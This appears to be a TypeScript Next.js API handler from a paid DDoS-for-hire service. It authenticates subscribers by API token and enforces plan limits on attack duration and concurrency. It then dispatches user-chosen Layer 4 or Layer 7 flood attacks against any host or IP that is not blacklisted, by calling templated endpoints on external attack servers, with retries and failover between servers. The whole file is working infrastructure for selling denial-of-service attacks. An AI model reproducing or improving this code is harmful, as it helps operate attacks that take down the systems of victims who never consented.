import type { NextApiRequest, NextApiResponse } from 'next';
import prisma from '../../../lib/prisma';
import axios from 'axios';
import { checkPlanExpiry } from '../../../lib/checkPlanExpiry';
import { isBlacklisted } from '../../../lib/blacklist';
import { getRequestIp, isRequestIpAllowed } from '../../../lib/apiIpWhitelist';
import { getBanInfo } from '../../../lib/adminModerationStore';
import { findAvailableServer } from '../../../lib/serverSelection';

type FailedAttack = {
  index: number;
  message: string;
};

interface AttackQueryParams {
  key: string;
  host: string;
  port?: string;
  time: string;
  method: string;
  size?: string;
  subnet?: string;
  concurrents?: string;
  additionalParams?: string;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'GET') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  await hehecarshere();

  const {
    key,
    host,
    port,
    time,
    method,
    size,
    subnet,
    concurrents,
    additionalParams,
  } = req.query as Partial<AttackQueryParams>;

  if (!key || !host || !time || !method) {
    return res.status(400).json({
      message: 'Missing required parameters: key, host, time, method',
    });
  }

  let concurrentsCount = 1;
  if (concurrents) {
    concurrentsCount = parseInt(concurrents, 10);
    if (isNaN(concurrentsCount) || concurrentsCount < 1) {
      return res.status(400).json({
        message: 'Invalid concurrents value. It must be a positive integer.',
      });
    }
  }

  try {
    const now = new Date();

    const user = await prisma.user.findFirst({
      where: { apiToken: key },
      select: { id: true, username: true, plan: true, apiAccess: true, rank: true },
    });

    if (!user) {
      return res.status(401).json({ message: 'Invalid API token' });
    }
    if (user.rank === 'banned') {
      const ban = getBanInfo(user.username);
      return res.status(403).json({
        message: ban?.reason ? `Account is banned: ${ban.reason}` : 'Account is banned',
      });
    }

    const requestIp = getRequestIp(req);
    if (!isRequestIpAllowed(user.id, requestIp)) {
      return res.status(403).json({
        message: 'Request IP is not whitelisted for this API token',
        requestIp: requestIp ?? 'unknown',
      });
    }

    const isPlanActive = await checkPlanExpiry(user.id);
    if (!isPlanActive) {
      await prisma.user.update({
        where: { id: user.id },
        data: { plan: 'Free' },
      });
      return res.status(403).json({
        message: 'Your plan has expired and has been downgraded to free.',
      });
    }

    if (!user.apiAccess) {
      return res.status(403).json({
        message: 'API access is not enabled for your account',
      });
    }

    const plan = await prisma.plan.findFirst({
      where: { name: user.plan },
      select: { concurrent: true, attackDuration: true },
    });

    if (!plan) {
      return res.status(404).json({ message: 'User plan not found' });
    }

    const activeAttacksCount = await prisma.attack.count({
      where: { userId: user.id, expiresAt: { gt: now }, status: 'active' },
    });

    if (activeAttacksCount + concurrentsCount > plan.concurrent) {
      return res.status(429).json({
        message: `Concurrent attack limit of ${plan.concurrent} reached. You can initiate up to ${
          plan.concurrent - activeAttacksCount
        } more concurrent attack(s).`,
      });
    }

    const duration = parseInt(time, 10);
    if (isNaN(duration) || duration <= 0 || duration > plan.attackDuration) {
      return res.status(400).json({
        message: `Duration should be between 1 and ${plan.attackDuration} seconds`,
      });
    }

    const methodDoc = await prisma.method.findUnique({
      where: { name: method },
      select: { type: true },
    });

    if (!methodDoc) {
      return res.status(404).json({ message: 'Method not found' });
    }

    const layer = methodDoc.type === 'l4' ? '4' : '7';

    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?:\/\d{1,2})?$/;
    const urlRegex = /^(https?:\/\/)?([\w-]+\.)+[\w-]+(\/[\w\- ./?%&=]*)?$/i;

    if (
      (layer === '4' && !ipRegex.test(host)) ||
      (layer === '7' && !urlRegex.test(host))
    ) {
      return res.status(400).json({
        message: `Invalid ${
          layer === '4' ? 'IP address' : 'URL'
        } format for Layer ${layer} attack`,
      });
    }

    if (isBlacklisted(host, layer as '4' | '7')) {
      return res.status(403).json({
        message: 'Target is blacklisted and cannot be attacked',
      });
    }

    const attackIds: number[] = [];
    const failedAttacks: FailedAttack[] = [];

    for (let i = 0; i < concurrentsCount; i++) {
      try {
        const attackId = await initiateExternalAttack(
          host,
          port,
          duration,
          method,
          size,
          subnet,
          additionalParams,
          user,
          layer as '4' | '7',
          now
        );
        attackIds.push(attackId);
      } catch (error) {
        failedAttacks.push({
          index: i,
          message: error instanceof Error ? error.message : String(error),
        });
      }
    }

    if (attackIds.length > 0 && failedAttacks.length === 0) {
      return res.status(200).json({
        message: 'All attacks started successfully',
        attackIds,
      });
    } else if (attackIds.length > 0 && failedAttacks.length > 0) {
      return res.status(207).json({
        message: 'Some attacks started successfully, while others failed',
        attackIds,
        failedAttacks,
      });
    } else {
      return res.status(500).json({
        message: 'Failed to start any attacks',
        failures: failedAttacks,
      });
    }
  } catch (error) {
    console.error('Error starting attack:', error);
    return res
      .status(500)
      .json({ message: 'Server error while initiating attack' });
  }
}

async function initiateExternalAttack(
  host: string,
  port: string | undefined,
  duration: number,
  method: string,
  size: string | undefined,
  subnet: string | undefined,
  additionalParams: string | undefined,
  user: { id: number },
  layer: '4' | '7',
  now: Date,
  retries: number = 2
): Promise<number> {
  const triedServerIds: number[] = [];

  while (true) {
    const server = await findAvailableServer(layer, method, triedServerIds);
    if (!server) {
      if (triedServerIds.length > 0) {
        throw new Error('All suitable servers failed to respond. Please try again later.');
      } else {
        throw new Error('No available servers at the moment');
      }
    }

    const apiUrl = server.endpoint
      .replace('[host]', encodeURIComponent(host))
      .replace('[port]', port ? encodeURIComponent(port) : '443')
      .replace('[time]', duration.toString())
      .replace('[method]', method)
      .replace('[size]', encodeURIComponent(size || '64'))
      .replace('[subnet]', subnet ? encodeURIComponent(subnet) : '32');

    console.log(`Attempting external attack on server ${server.name} (ID: ${server.id})`);

    let attempt = 0;
    while (attempt <= retries) {
      try {
        const response = await axios.get(apiUrl, { timeout: 10000 });
        console.log(`Server ${server.name} response:`, response.status, response.data);

        if (response.status >= 200 && response.status < 300) {
          const expiresAt = new Date(now.getTime() + duration * 1000);
          const newAttack = await prisma.attack.create({
            data: {
              userId: user.id,
              layer: layer,
              target: host,
              port: layer === '4' ? port || null : null,
              duration: duration,
              methodName: method,
              additionalParams: additionalParams
                ? JSON.stringify({ subnet: subnet })
                : null,
              expiresAt: expiresAt,
              status: 'active',
              serverId: server.id,
            },
          });

          return newAttack.id;
        } else {
          throw new Error(`Server returned status ${response.status}`);
        }
      } catch (error) {
        console.log(
          `Request Error on server ${server.name} (Attempt ${attempt + 1}):`,
          error instanceof Error ? error.message : error
        );
        if (attempt === retries) {
          break;
        }
        attempt++;
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }

    triedServerIds.push(server.id);
    console.log(`Server ${server.name} failed. Trying next available server...`);
  }
}

async function hehecarshere(): Promise<void> {
  try {
    const now = new Date();

    await prisma.attack.updateMany({
      where: { expiresAt: { lt: now }, status: 'active' },
      data: { status: 'expired' },
    });
  } catch (error) {
    console.error('Error managing Attack collection:', error);
  }
}
